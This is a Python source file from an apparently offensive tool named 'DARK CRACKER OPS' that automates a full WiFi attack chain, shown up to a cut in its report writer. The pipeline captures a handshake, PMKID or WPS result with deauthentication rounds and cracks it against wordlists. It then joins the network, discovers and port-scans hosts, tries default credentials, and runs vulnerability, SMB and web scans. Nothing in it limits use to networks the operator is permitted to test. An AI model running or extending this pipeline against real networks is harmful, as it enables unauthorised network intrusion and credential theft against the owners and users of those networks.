"""
cli/automation.py — Fully automated WiFi attack engine.
After the initial two-question startup, everything runs without user input.
All results are saved to a timestamped .txt report.
"""

import concurrent.futures
import os
import sys
import subprocess
import tempfile
import threading
import time
from datetime import datetime
from typing import Optional

# ── Path helper ────────────────────────────────────────────────────────────────
_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if _ROOT not in sys.path:
    sys.path.insert(0, _ROOT)

from cli.colors import cyan, green, red, yellow, bold, dim, gray, RESET


# ── Thread-safe print ──────────────────────────────────────────────────────────
_print_lock = threading.Lock()


def _p(*args, **kw):
    with _print_lock:
        print(*args, **kw)


def _step(n: int, total: int, label: str) -> None:
    _p(f"\n{bold(cyan(f'[STEP {n}/{total}]'))} {bold(label)}")
    _p(cyan("─" * 60))


def _log(tag: str, msg: str) -> None:
    ts  = time.strftime("%H:%M:%S")
    tag = tag.upper()
    color_map = {
        "INFO": cyan, "OK": green, "SUCCESS": green,
        "WARN": yellow, "ERROR": red, "FAIL": red,
        "WIFI": cyan,
        "ATTACK": yellow, "CRACK": yellow, "NET": cyan,
    }
    cfn = color_map.get(tag, dim)
    _p(f"  {gray(ts)}  {cfn(f'[{tag}]'):<22}  {msg}")


def _pipeline(stages: list, current: str) -> None:
    """Print a one-line pipeline indicator."""
    parts = []
    for s in stages:
        if s == current:
            parts.append(bold(cyan(f"[{s}]")))
        else:
            parts.append(dim(f" {s} "))
    _p("\r  " + " → ".join(parts) + "  ", end="", flush=True)


# ── Wordlist finder ────────────────────────────────────────────────────────────

# Ordered list of all wordlists to attempt during cracking.
# wifite.txt (wordlist-probable) is WiFi-optimised and must come FIRST —
# it contains common WiFi passwords (year combos, keyboard walks, etc.)
# that are absent from rockyou.txt, which is skewed toward web/account creds.
_WORDLIST_CHAIN = [
    "/usr/share/wordlists/wifite.txt",           # WiFi-optimised, ~715k entries — fastest
    "/usr/share/dict/wordlist-probable.txt",     # Same file, alternate path
    "/usr/share/wordlists/fasttrack.txt",        # Common default/router creds
    "/usr/share/wordlists/rockyou.txt",          # Large general fallback, 14M entries
    "/usr/share/seclists/Passwords/Common-Credentials/"
    "10-million-password-list-top-1000.txt",
]


def _find_wordlists(ssid: str = "") -> list[str]:
    """
    Return an ordered list of available wordlist paths to attempt in sequence.
    Uses the WiFi-optimised wifite.txt first (contains patterns like year-combos
    that are common WiFi passwords but absent from rockyou.txt), then rockyou.txt
    as a large catch-all fallback.  Deduplicates resolved symlink targets so the
    same file is never tried twice.
    """
    seen_real: set[str] = set()
    found: list[str] = []
    for p in _WORDLIST_CHAIN:
        if not os.path.isfile(p):
            continue
        real = os.path.realpath(p)  # resolve symlinks — wifite.txt → wordlist-probable.txt
        if real in seen_real:
            continue
        seen_real.add(real)
        found.append(p)

    if found:
        labels = ", ".join(os.path.basename(p) for p in found)
        _p(f"  {green('✔')}  Wordlists: {cyan(labels)}")
        return found

    # Fallback: generate SSID mutations
    _p(f"  {yellow('⚠')}  No standard wordlist found. Generating SSID mutations for '{ssid}'…")
    try:
        from modules.wordlist_manager import WordlistManager
        mutations = WordlistManager().generate_ssid_mutations(ssid or "default")
        tf = tempfile.NamedTemporaryFile(
            mode="w", suffix=".txt", prefix="dc_wl_", delete=False
        )
        tf.write("\n".join(mutations))
        tf.close()
        _p(f"  {green('✔')}  Generated {len(mutations)} mutations → {tf.name}")
        return [tf.name]
    except Exception as e:
        _p(f"  {red('✖')}  Could not generate wordlist: {e}")
        return []


def _find_wordlist(ssid: str = "") -> str:
    """Return the first available wordlist (backwards-compat helper)."""
    wls = _find_wordlists(ssid)
    return wls[0] if wls else ""


# ══════════════════════════════════════════════════════════════════════════════
#  WiFiAutomation
# ══════════════════════════════════════════════════════════════════════════════

class WiFiAutomation:
    """
    Fully automated WiFi attack pipeline.
    Runs 10 steps without user interaction after construction.
    """

    STAGES = ["SCAN", "TARGET", "WORDLIST", "ATTACK", "CRACK",
              "CONNECT", "DISCOVER", "PORTS", "POSTEX", "REPORT"]

    def __init__(self, interface: str):
        self.interface   = interface
        self.mon_iface   = interface     # updated after monitor mode is enabled
        self._networks: list  = []
        self._target:   dict  = {}
        self._wordlist: str   = ""       # first wordlist (for attack_engine config)
        self._wordlists: list = []       # full ordered chain for sequential cracking
        self._capture:  str   = ""
        self._cap_type: str   = ""
        self._password: str   = ""
        self._hosts:    list  = []
        self._ports:    list  = []
        self._vulns:    list  = []
        self._creds:    list  = []
        self._events:   list  = []
        self._shares:   list  = []
        self._web:      list  = []
        self._timeline: list  = []
        self._has_internet: bool = False
        self._net_intel: dict = {}

    def _event(self, msg: str) -> None:
        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self._events.append({"time": ts, "message": msg})

    def _ts(self, label: str) -> None:
        """Record a timeline entry with label, current time, and timestamp."""
        self._timeline.append({
            "step": label,
            "time": datetime.now(),
            "ts":   time.time(),
        })

    # ── Public entry point ─────────────────────────────────────────────────────

    def run(self) -> None:
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        report_path = os.path.join(os.getcwd(), f"darkcracker_report_{ts}.txt")

        try:
            self._step_monitor()
            self._step_scan()
            self._step_target()
            self._step_wordlist()
            self._step_attack()
            if self._password:
                self._step_connect()
                self._step_discover()
                self._step_ports()
                self._step_postex()
            else:
                _p(f"\n  {yellow('⚠')}  Password not found — skipping post-exploitation steps.")
                self._event("Password not found — skipping network post-exploitation.")
        except KeyboardInterrupt:
            _p(f"\n\n  {yellow('⚠')}  Interrupted by user.")
            self._event("Run interrupted by user (Ctrl-C).")
        except Exception as e:
            _p(f"\n  {red('✖')}  Fatal error: {e}")
            self._event(f"Fatal error: {e}")
        finally:
            self._save_report(report_path)
            _p(f"\n  {green('✔')}  Report saved: {bold(cyan(report_path))}\n")

    # ── Step 0: Monitor mode ───────────────────────────────────────────────────

    def _step_monitor(self) -> None:
        _step(0, 10, "Enabling monitor mode")
        try:
            from modules.interface_manager import InterfaceManager
            im = InterfaceManager()
            ok, mon_iface = im.enable_monitor_mode(self.interface)
            if ok:
                self.mon_iface = mon_iface
                _p(f"  {green('✔')}  Monitor mode enabled → {cyan(mon_iface)}")
                self._event(f"Monitor mode enabled: {mon_iface}")
            else:
                _p(f"  {red('✖')}  Could not enable monitor mode: {mon_iface}")
                _p(f"  {yellow('⚠')}  Attempting to continue with {self.interface}…")
                self._event(f"Monitor mode failed: {mon_iface}")
        except Exception as e:
            _p(f"  {red('✖')}  InterfaceManager error: {e}")
            self._event(f"Monitor mode exception: {e}")

    # ── Step 1: Network scan ───────────────────────────────────────────────────

    def _step_scan(self) -> None:
        _step(1, 10, "Scanning WiFi networks (45 seconds)")
        _pipeline(self.STAGES, "SCAN")
        _p()
        self._ts("scan_start")

        done  = threading.Event()
        networks_ref: list = []

        # ── Channel hopping thread ─────────────────────────────────────────────
        _hop_stop = threading.Event()

        def _channel_hop():
            while not _hop_stop.is_set():
                for ch in range(1, 14):
                    if _hop_stop.is_set():
                        break
                    try:
                        subprocess.run(
                            ["iwconfig", self.mon_iface, "channel", str(ch)],
                            capture_output=True, timeout=2,
                        )
                    except Exception:
                        pass
                    time.sleep(0.5)

        hop_thread = threading.Thread(target=_channel_hop, daemon=True)
        hop_thread.start()

        def _on_networks(nets: list) -> None:
            networks_ref.clear()
            networks_ref.extend(nets)
            _p(f"\r  {cyan('Networks found:')} {green(str(len(nets)))}   ", end="", flush=True)

        def _on_log(tag: str, msg: str) -> None:
            _log(tag, msg)

        def _on_done() -> None:
            done.set()

        try:
            from modules.wifi_scanner import WiFiScanner
            scanner = WiFiScanner(
                interface   = self.mon_iface,
                on_networks = _on_networks,
                on_log      = _on_log,
                on_done     = _on_done,
                duration    = 45,
            )
            scanner.start()
            done.wait(timeout=60)
            scanner.stop()
            scanner.join(timeout=5)
        except Exception as e:
            _p(f"\n  {red('✖')}  Scan error: {e}")
            self._event(f"Scan error: {e}")
            return

        # Stop channel hopping
        _hop_stop.set()
        hop_thread.join(timeout=2)

        _p()
        self._networks = list(networks_ref)
        self._ts("scan_end")
        _p(f"  {green('✔')}  Scan complete — {len(self._networks)} network(s) found.")
        self._event(f"WiFi scan complete: {len(self._networks)} networks")

        if self._networks:
            _p(f"\n  {'SSID':<30}  {'BSSID':<20}  {'CH':>3}  {'ENC':<8}  {'PWR':>5}  WPS")
            _p("  " + "─" * 75)
            for n in self._networks:
                wps = green("YES") if n.get("wps") else dim("no")
                _p(
                    f"  {n.get('ssid','<hidden>'):<30}  "
                    f"{n.get('bssid',''):<20}  "
                    f"{str(n.get('channel','')):<4}  "
                    f"{n.get('enc',''):<8}  "
                    f"{str(n.get('power','')):<6}  "
                    f"{wps}"
                )

    # ── Step 2: Target selection ───────────────────────────────────────────────

    def _step_target(self) -> None:
        _step(2, 10, "Select target network")
        _pipeline(self.STAGES, "TARGET")
        _p()

        if not self._networks:
            _p(f"  {red('✖')}  No networks found to target.")
            self._event("No networks available for targeting.")
            return

        # Print full numbered table
        _p(f"  {'#':<4}  {'SSID':<30}  {'BSSID':<20}  {'CH':>3}  {'ENC':<8}  {'PWR':>6}  WPS")
        _p("  " + "─" * 80)
        for i, n in enumerate(self._networks, 1):
            wps = green("YES") if n.get("wps") else dim("no")
            _p(
                f"  {cyan(str(i)):<4}  "
                f"{n.get('ssid','<hidden>'):<30}  "
                f"{n.get('bssid',''):<20}  "
                f"{str(n.get('channel','')):<4}  "
                f"{n.get('enc',''):<8}  "
                f"{str(n.get('power','')):<7}  "
                f"{wps}"
            )
        _p()

        # User picks one
        while True:
            try:
                raw = input(f"  {cyan('▶')} Select target [1-{len(self._networks)}]: ").strip()
                idx = int(raw) - 1
                if 0 <= idx < len(self._networks):
                    break
                _p(f"  Enter a number between 1 and {len(self._networks)}.")
            except (ValueError, EOFError, KeyboardInterrupt):
                _p(f"\n  {red('✖')}  No target selected — aborting.")
                self._event("Target selection cancelled by user.")
                return

        self._target = self._networks[idx]
        _p(f"\n  {green('✔')}  Target: {bold(cyan(self._target.get('ssid','?')))}  "
           f"{dim(self._target.get('bssid',''))}")
        self._event(f"Target selected: {self._target.get('ssid','?')} ({self._target.get('bssid','')})")

    # ── Step 3: Wordlist ───────────────────────────────────────────────────────

    def _step_wordlist(self) -> None:
        _step(3, 10, "Selecting wordlist")
        _pipeline(self.STAGES, "WORDLIST")
        _p()
        self._wordlists = _find_wordlists(self._target.get("ssid", ""))
        self._wordlist  = self._wordlists[0] if self._wordlists else ""
        self._event(f"Wordlist chain: {', '.join(self._wordlists)}")

    # ── Step 4: Attack execution ───────────────────────────────────────────────

    def _step_attack(self) -> None:
        _step(4, 10, "Executing attack")
        _pipeline(self.STAGES, "ATTACK")
        _p()

        if not self._target:
            _p(f"  {red('✖')}  No target selected — skipping attack.")
            return

        done = threading.Event()
        capture_ref = [None, None]  # [path, type]

        def _on_log(tag: str, msg: str) -> None:
            _log(tag, msg)
            self._events.append({"time": time.strftime("%H:%M:%S"), "message": f"[{tag}] {msg}"})

        def _on_phase(phase: str) -> None:
            stage = "ATTACK"
            for kw, st in [("crack","CRACK"),("pmkid","ATTACK"),("handshake","ATTACK"),("wps","ATTACK")]:
                if kw in phase.lower():
                    stage = st
            _p(f"\n  {cyan('▶')}  {bold(phase)}")
            _pipeline(self.STAGES, stage)

        def _on_progress(pct: int) -> None:
            bar = "█" * (pct // 5) + "░" * (20 - pct // 5)
            _p(f"\r  {cyan(f'[{bar}]')} {pct:3}%  ", end="", flush=True)

        def _on_capture(path: str, ctype: str) -> None:
            capture_ref[0] = path
            capture_ref[1] = ctype
            _p(f"\n  {green('✔')}  Capture: {cyan(path)} ({ctype})")
            self._event(f"Capture obtained: {path} [{ctype}]")

        def _on_pmkid(path: str) -> None:
            capture_ref[0] = path
            capture_ref[1] = "pmkid"
            _p(f"\n  {green('✔')}  PMKID hash: {cyan(path)}")
            self._event(f"PMKID captured: {path}")

        def _on_handshake(path: str) -> None:
            capture_ref[0] = path
            capture_ref[1] = "handshake"
            _p(f"\n  {green('✔')}  Handshake: {cyan(path)}")
            self._event(f"Handshake captured: {path}")

        def _on_wps_pin(result: str) -> None:
            _p(f"\n  {green('✔')}  WPS result: {bold(green(result))}")
            self._event(f"WPS attack result: {result}")
            # Extract PSK if present
            if "PSK:" in result:
                self._password = result.split("PSK:")[-1].strip().split()[0]
            done.set()

        def _on_finished(success: bool) -> None:
            _p(f"\n  {green('●') if success else yellow('●')}  Attack phase finished (success={success})")
            done.set()

        config = {
            "interface":         self.mon_iface,
            "bssid":             self._target.get("bssid", ""),
            "ssid":              self._target.get("ssid", ""),
            "channel":           int(self._target.get("channel", 1)),
            "enc":               self._target.get("enc", "WPA2"),
            "wordlist":          self._wordlist,
            "mode":              "Auto",
            "timeout":           180,
            "max_deauth_rounds": 15,
        }

        try:
            from modules.attack_engine import AutoAttackEngine
            engine = AutoAttackEngine(
                config       = config,
                on_log       = _on_log,
                on_progress  = _on_progress,
                on_phase     = _on_phase,
                on_capture   = _on_capture,
                on_finished  = _on_finished,
                on_pmkid     = _on_pmkid,
                on_handshake = _on_handshake,
                on_wps_pin   = _on_wps_pin,
            )
            engine.start()
            done.wait(timeout=600)   # 10 min: PMKID(2m) + WPS(15s) + handshake(3m) + buffer
            engine.stop()
            engine.join(timeout=15)
        except Exception as e:
            _p(f"\n  {red('✖')}  Attack engine error: {e}")
            self._event(f"Attack engine error: {e}")
            return

        self._capture = capture_ref[0] or ""
        self._cap_type = capture_ref[1] or ""

        # Move straight to cracking if we have a capture and no password yet
        if self._capture and not self._password:
            self._step_crack()

    # ── Step 5: Password cracking ──────────────────────────────────────────────

    def _step_crack(self) -> None:
        _step(5, 10, "Cracking captured handshake / PMKID")
        _pipeline(self.STAGES, "CRACK")
        _p()

        if not self._capture:
            _p(f"  {yellow('⚠')}  No capture file — skipping crack.")
            return

        # Build the ordered wordlist chain: use _wordlists if populated,
        # fall back to the single _wordlist entry for backwards compatibility.
        wordlist_chain = self._wordlists if self._wordlists else (
            [self._wordlist] if self._wordlist else []
        )
        if not wordlist_chain:
            _p(f"  {yellow('⚠')}  No wordlist available — skipping crack.")
            return

        from modules.cracker import Cracker

        # Iterate through wordlists in order until the password is found.
        for wl_idx, wordlist in enumerate(wordlist_chain, 1):
            if self._password:
                break   # found by a previous wordlist — nothing more to do

            _p(f"\n  {cyan('▶')}  Wordlist {wl_idx}/{len(wordlist_chain)}: "
               f"{bold(os.path.basename(wordlist))}")
            self._event(f"Cracking with wordlist: {wordlist}")

            done = threading.Event()

            def _on_log(tag: str, msg: str) -> None:
                _log(tag, msg)

            def _on_progress(pct: int) -> None:
                bar = "█" * (pct // 5) + "░" * (20 - pct // 5)
                _p(f"\r  {cyan(f'[{bar}]')} {pct:3}%  ", end="", flush=True)

            def _on_speed(speed: str) -> None:
                _p(f"\r  {cyan('Speed:')} {speed:<30}  ", end="", flush=True)

            def _on_password(pwd: str) -> None:
                _p()
                _p(f"\n  {green('✔')} {'─'*56}")
                _p(f"  {green('✔')}  PASSWORD FOUND: {bold(green(pwd))}")
                _p(f"  {green('✔')} {'─'*56}")
                self._password = pwd
                self._event(f"PASSWORD CRACKED: {pwd}")
                done.set()

            def _on_finished(ok: bool) -> None:
                _p()
                if not done.is_set():
                    if ok:
                        _p(f"  {green('✔')}  Cracking complete.")
                    else:
                        _p(f"  {yellow('⚠')}  Password not found in "
                           f"{os.path.basename(wordlist)}.")
                        self._event(
                            f"Cracking exhausted {os.path.basename(wordlist)} "
                            "— password not found.")
                done.set()

            crack_config = {
                "capture_file": self._capture,
                "capture_type": self._cap_type,
                "wordlist":     wordlist,
                "bssid":        self._target.get("bssid", ""),
                "ssid":         self._target.get("ssid", ""),
            }

            try:
                cracker = Cracker(
                    config      = crack_config,
                    on_log      = _on_log,
                    on_progress = _on_progress,
                    on_speed    = _on_speed,
                    on_password = _on_password,
                    on_finished = _on_finished,
                )
                cracker.start()
                done.wait(timeout=7200)
                cracker.stop()
                cracker.join(timeout=15)
            except Exception as e:
                _p(f"\n  {red('✖')}  Cracker error: {e}")
                self._event(f"Cracker error: {e}")

        if not self._password:
            _p(f"\n  {yellow('⚠')}  Password not found in any wordlist.")
            self._event("All wordlists exhausted — password not found.")

    # ── Step 6: Auto-connect ───────────────────────────────────────────────────

    def _step_connect(self) -> None:
        _step(6, 10, f"Connecting to network")
        _pipeline(self.STAGES, "CONNECT")
        _p()

        ssid = self._target.get("ssid", "")

        # ── Restore managed mode before using nmcli ────────────────────────────
        # airmon-ng check kill (run during monitor mode setup) kills
        # NetworkManager and wpa_supplicant.  nmcli will fail unless NM is
        # restarted and the interface is put back in managed mode.
        _p(f"  {cyan('▶')}  Restoring managed mode on {self.mon_iface}…")
        try:
            subprocess.run(
                ["airmon-ng", "stop", self.mon_iface],
                capture_output=True, timeout=15,
            )
        except Exception:
            pass

        _p(f"  {cyan('▶')}  Restarting NetworkManager…")
        try:
            subprocess.run(
                ["systemctl", "restart", "NetworkManager"],
                capture_output=True, timeout=20,
            )
            time.sleep(4)   # allow NM to fully initialise before nmcli
        except Exception:
            try:
                subprocess.run(
                    ["service", "NetworkManager", "restart"],
                    capture_output=True, timeout=20,
                )
                time.sleep(4)
            except Exception:
                pass

        _p(f"  {cyan('▶')}  nmcli connect: SSID={ssid}  PWD={self._password}")
        try:
            result = subprocess.run(
                ["nmcli", "dev", "wifi", "connect", ssid,
                 "password", self._password],
                capture_output=True, text=True, timeout=30,
            )
            output = result.stdout.strip() + result.stderr.strip()
            if result.returncode == 0 or "successfully activated" in output.lower():
                _p(f"  {green('✔')}  Connected to {cyan(ssid)}")
                self._event(f"Connected to {ssid}")
            else:
                _p(f"  {yellow('⚠')}  nmcli output: {output[:200]}")
                self._event(f"nmcli connect result: {output[:200]}")
        except subprocess.TimeoutExpired:
            _p(f"  {yellow('⚠')}  Connection attempt timed out.")
            self._event("nmcli connection timed out.")
        except FileNotFoundError:
            _p(f"  {red('✖')}  nmcli not found.")
            self._event("nmcli not available.")
        except Exception as e:
            _p(f"  {red('✖')}  Connect error: {e}")
            self._event(f"Connect error: {e}")

        time.sleep(3)  # allow DHCP

        # Internet connectivity check
        try:
            r = subprocess.run(
                ["ping", "-c", "1", "-W", "3", "8.8.8.8"],
                capture_output=True, timeout=10,
            )
            self._has_internet = r.returncode == 0
            _p(f"  {'✔' if self._has_internet else '✖'}  Internet: {'YES' if self._has_internet else 'NO'}")
            self._event(f"Internet connectivity: {'YES' if self._has_internet else 'NO'}")
        except Exception as e:
            _p(f"  {yellow('⚠')}  Internet check failed: {e}")

        # Build network intelligence
        self._build_net_intel()

    def _build_net_intel(self) -> None:
        """Compute network intelligence metrics after connecting."""
        bssid = self._target.get("bssid", "")
        enc   = self._target.get("enc", "WPA2").upper()

        # Vendor from BSSID OUI
        try:
            from modules.evil_twin import _detect_vendor
            vendor = _detect_vendor(bssid)
        except Exception:
            vendor = "unknown"

        # Security rating
        if "WPA3" in enc:
            rating = 9
        elif "WPA2" in enc and not self._target.get("wps"):
            rating = 6
        elif "WPA2" in enc and self._target.get("wps"):
            rating = 4
        elif "WEP" in enc:
            rating = 1
        else:
            rating = 5

        # Default creds likelihood
        consumer_brands = {"tplink", "netgear", "asus", "dlink", "huawei"}
        default_creds_likely = vendor in consumer_brands

        self._net_intel = {
            "vendor":               vendor,
            "security_rating":      f"{rating}/10",
            "encryption":           enc,
            "wps_enabled":          str(bool(self._target.get("wps"))),
            "default_creds_likely": str(default_creds_likely),
            "internet_access":      str(self._has_internet),
            "channel":              str(self._target.get("channel", "")),
            "bssid":                bssid,
        }
        _p(f"  {cyan('▶')}  Network Intel: vendor={vendor} | rating={rating}/10 | default_creds={default_creds_likely}")
        self._event(f"Network intelligence computed: vendor={vendor}, rating={rating}/10")

    # ── Step 7: Network discovery ──────────────────────────────────────────────

    def _step_discover(self) -> None:
        _step(7, 10, "Discovering hosts on network")
        _pipeline(self.STAGES, "DISCOVER")
        _p()

        done = threading.Event()

        def _on_host(h: dict) -> None:
            self._hosts.append(h)
            _p(f"  {cyan('HOST')}  {h.get('ip','?'):<18}  {h.get('mac',''):<20}  {h.get('hostname','')}")

        def _on_log(tag: str, msg: str) -> None:
            _log(tag, msg)

        def _on_finished(ok: bool) -> None:
            done.set()

        try:
            from modules.network_discovery import NetworkDiscovery
            nd = NetworkDiscovery(
                on_host     = _on_host,
                on_log      = _on_log,
                on_finished = _on_finished,
            )
            # Do NOT set nd.target — let NetworkDiscovery._detect_subnet()
            # auto-detect the current subnet from `ip route` / `ip addr`.
            # Hardcoding 192.168.1.0/24 would scan the wrong network when
            # the target AP uses a different address range (e.g. 192.168.31.0/24).
            nd.start()
            done.wait(timeout=180)
            nd.stop()
            nd.join(timeout=10)
        except Exception as e:
            _p(f"\n  {red('✖')}  Discovery error: {e}")
            self._event(f"Discovery error: {e}")
            return

        _p(f"\n  {green('✔')}  {len(self._hosts)} host(s) discovered.")
        self._event(f"Host discovery: {len(self._hosts)} hosts")

    # ── Step 8: Port scanning (parallel) ──────────────────────────────────────

    def _step_ports(self) -> None:
        _step(8, 10, f"Port scanning {len(self._hosts)} host(s)")
        _pipeline(self.STAGES, "PORTS")
        _p()
        self._ts("ports_start")

        DEFAULT_PORTS = (
            "21,22,23,25,53,80,110,139,143,443,445,993,"
            "995,1433,3306,3389,5432,5900,8080,8443"
        )

        def _scan_host(h: dict) -> None:
            ip = h.get("ip", "")
            if not ip:
                return
            _p(f"  {cyan('▶')}  Scanning {ip}…")
            done = threading.Event()

            def _on_port(p: dict) -> None:
                self._ports.append(dict(p, host=ip))
                svc = f"{p.get('service','')}/{p.get('version','')[:20]}"
                _p(f"    {green('PORT')} {str(p.get('port','')):<7}  {p.get('state',''):<8}  {svc}")

            def _on_vuln(v: dict) -> None:
                self._vulns.append(dict(v, host=ip))
                _p(f"    {red('VULN')} {v.get('cve_id',''):<20}  {v.get('severity','')}  {v.get('description','')[:40]}")

            def _on_log(tag: str, msg: str) -> None:
                _log(tag, msg)

            def _on_fin(ok: bool) -> None:
                done.set()

            try:
                from modules.port_scanner import PortScanner
                ps = PortScanner(
                    on_port = _on_port,
                    on_vuln = _on_vuln,
                    on_log  = _on_log,
                )
                ps.target    = ip
                ps.ports     = DEFAULT_PORTS
                if hasattr(ps, "on_finished"):
                    ps.on_finished = _on_fin
                ps.start()
                done.wait(timeout=300)
                ps.stop()
                ps.join(timeout=10)
            except Exception as e:
                _p(f"  {red('✖')}  Port scan {ip}: {e}")
                self._event(f"Port scan error ({ip}): {e}")

        # Run all hosts in parallel (up to 5 workers)
        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as ex:
            futures = [ex.submit(_scan_host, h) for h in self._hosts]
            concurrent.futures.wait(futures, timeout=400)

        self._ts("ports_end")
        self._event(f"Port scan complete: {len(self._ports)} open ports, {len(self._vulns)} vulns")

    # ── Step 9: Post-exploitation ──────────────────────────────────────────────

    def _step_postex(self) -> None:
        _step(9, 10, "Post-exploitation")
        _pipeline(self.STAGES, "POSTEX")
        _p()

        # Group ports by host
        host_ports: dict = {}
        for p in self._ports:
            ip = p.get("host", "")
            host_ports.setdefault(ip, []).append(p.get("port", 0))

        all_ips = [h.get("ip","") for h in self._hosts if h.get("ip")]

        # ── Default creds across all hosts ────────────────────────────────────
        if all_ips:
            _p(f"\n  {cyan('▶')}  Testing default credentials on {len(all_ips)} host(s)…")
            done = threading.Event()
            try:
                from modules.post_exploit.default_creds import DefaultCredsTester
                tester = DefaultCredsTester(
                    hosts        = self._hosts,
                    on_cred_found= lambda c: (self._creds.append(c),
                                              _p(f"  {green('CRED')}  {c.get('host','')}  "
                                                 f"{c.get('service','')}  "
                                                 f"{c.get('username','')}:{c.get('password','')}")),
                    on_log       = lambda t, m: _log(t, m),
                    on_finished  = lambda ok: done.set(),
                )
                tester.start()
                done.wait(timeout=300)
                tester.stop()
                tester.join(timeout=10)
                self._event(f"Default creds: {len(self._creds)} valid")
            except Exception as e:
                _p(f"  {red('✖')}  Default creds error: {e}")
                self._event(f"Default creds error: {e}")

        # ── Vuln scanner on all hosts ─────────────────────────────────────────
        for ip in all_ips:
            ports_for_host = ",".join(str(p) for p in host_ports.get(ip, [80, 443, 445]))
            _p(f"\n  {cyan('▶')}  VulnScan: {ip}")
            done = threading.Event()
            try:
                from modules.post_exploit.vuln_scanner import VulnScanner
                vs = VulnScanner(
                    on_vuln_found = lambda v: (self._vulns.append(dict(v, host=ip)),
                                               _p(f"  {red('VULN')}  {v.get('cve_id','N/A')}  "
                                                  f"{v.get('severity','')}  CVSS:{v.get('cvss_score','?')}")),
                    on_log        = lambda t, m: _log(t, m),
                    on_finished   = lambda ok: done.set(),
                )
                vs.target = ip
                vs.ports  = ports_for_host
                vs.start()
                done.wait(timeout=180)
                vs.stop()
                vs.join(timeout=10)
            except Exception as e:
                _p(f"  {red('✖')}  VulnScan {ip}: {e}")
                self._event(f"VulnScan error ({ip}): {e}")

        # ── SMB scan on port-445 hosts ────────────────────────────────────────
        smb_hosts = [h for h in self._hosts if 445 in host_ports.get(h.get("ip",""), [])]
        if smb_hosts:
            _p(f"\n  {cyan('▶')}  SMB scan on {len(smb_hosts)} host(s)…")
            done = threading.Event()
            try:
                from modules.post_exploit.smb_scanner import SMBScanner
                smb = SMBScanner(
                    hosts         = smb_hosts,
                    on_share_found= lambda s: (self._shares.append(s),
                                               _p(f"  {cyan('SHARE')}  {s}")),
                    on_vuln_found = lambda v: (self._vulns.append(v),
                                               _p(f"  {red('SMB VULN')}  {v.get('cve','')}")),
                    on_log        = lambda t, m: _log(t, m),
                    on_finished   = lambda ok: done.set(),
                )
                smb.start()
                done.wait(timeout=180)
                smb.stop()
                smb.join(timeout=10)
            except Exception as e:
                _p(f"  {red('✖')}  SMB scan error: {e}")
                self._event(f"SMB scan error: {e}")

        # ── Web scan on HTTP/HTTPS hosts ──────────────────────────────────────
        for ip in all_ips:
            ports_open = host_ports.get(ip, [])
            for port, scheme in [(80, "http"), (443, "https"), (8080, "http"), (8443, "https")]:
                if port in ports_open:
                    url = f"{scheme}://{ip}:{port}"
                    _p(f"\n  {cyan('▶')}  Web scan: {url}")
                    try:
                        from modules.post_exploit.web_scanner import WebScanner
                        ws = WebScanner(
                            on_result   = lambda r: self._web.append(r),
                            on_progress = lambda pct: None,
                            on_complete = lambda: None,
                            on_error    = lambda e: _p(f"  {red('✖')}  {e}"),
                        )
                        ws.scan(url)
                    except Exception as e:
                        _p(f"  {red('✖')}  Web scan {url}: {e}")
                        self._event(f"Web scan error ({url}): {e}")

        _p(f"\n  {green('✔')}  Post-exploitation complete.")
        self._event(f"Post-exploitation done: {len(self._creds)} creds, {len(self._vulns)} vulns")

    # ── Step 10: Save report ───────────────────────────────────────────────────

    def _save_report(self, path: str) -> None:
        _step(10, 10, "Saving report")
        _pipeline(self.STAGES, "REPORT")
        _p()

        # Build timeline events
        timeline_events = []
        for entry in self._timeline:
            timeline_events.append({
                "time":    entry["time"].strftime("%Y-%m-%d %H:%M:%S") if hasattr(entry["time"], "strftime") else str(entry["time"]),
                "message": f"Step: {entry['step']}",
            })

        # Build data dict for ReportGenerator
        data = {
            "metadata": {
                "engagement_name": "DARK CRACKER OPS Automated Run",
                "date":            datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "operator":        "DarkCracker Automation",
                "classification":  "CONFIDENTIAL",
                "adapter":         self.interface,
            },
            "sections": [
                "Executive Summary",
                "WiFi Networks Found",
                "Network Hosts",
                "Open Ports & Services",
                "Vulnerability Findings",
                "Discovered Credentials",
                "Attack Timeline",
                "Network Intelligence",
                "Recommendations",
                "Technical Appendix",
            ],
            "executive_summary_text": self._build_exec_summary(),
            "wifi_networks":     [self._net_to_dict(n) for n in self._networks],
            "hosts":             self._hosts,
            "ports":             self._ports,
            "vulnerabilities":   self._vulns,
            "creds":             self._creds,
            "events":            self._events + timeline_events,
            "network_intelligence": self._net_intel,
        }

        try:
            from modules.report_generator import ReportGenerator
            ok = ReportGenerator().generate(data=data, output_path=path, fmt="TXT")
            if ok:
                _p(f"  {green('✔')}  Report written.")
            else:
                _p(f"  {yellow('⚠')}  ReportGenerator returned False — writing fallback.")
                self._write_fallback_txt(path, data)
        except Exception as e:
            _p(f"  {yellow('⚠')}  ReportGenerator error: {e} — writing fallback.")
            self._write_fallback_txt(path, data)

    def _build_exec_summary(self) -> str:
        lines = [
            f"Automated WiFi penetration test by DARK CRACKER OPS Generation 2.",
            f"Adapter    : {self.interface}",
            f"Target     : {self._target.get('ssid','N/A')} ({self._target.get('bssid','N/A')})",
            f"Encryption : {self._target.get('enc','?')}",
            f"Password   : {'FOUND: ' + self._password if self._password else 'Not found'}",
            f"Hosts      : {len(self._hosts)}",
            f"Open ports : {len(self._ports)}",
            f"Vulns      : {len(self._vulns)}",
            f"Credentials: {len(self._creds)}",
        ]
        return "\n".join(lines)

    @staticmethod
    def _net_to_dict(n: dict) -> dict:
        return {
            "ssid":    n.get("ssid", ""),
            "bssid":   n.get("bssid", ""),
            "channel": n.get("channel", ""),
            "enc":     n.get("enc", ""),
            "signal":  n.get("power", ""),
            "wps":     "YES" if n.get("wps") else "no",
        }

    @staticmethod
    def _write_fallback_txt(path: str, data: dict) -> None:
        """Emergency plain-text fallback writer."""
        sep = "=" * 72
        thin = "-" * 72
        lines = [
            sep,
            "  DARK CRACKER OPS — Generation 2 — AUTOMATED REPORT",
            sep, "",
        ]
        meta = data.get("metadata", {})
        for k, v in meta.items():
            lines.append(f"  {k:<22}: {v}")
        lines.append("")
        lines.append(data.get("executive_summary_text", ""))
        lines.append("")

        def section(title: str, items: list) -> None:
            lines.extend([sep, f"  {title}", thin, ""])
            if not items:
                lines.append("  (none)")
            else:
                for item in items:
                    if isinstance(item, dict):
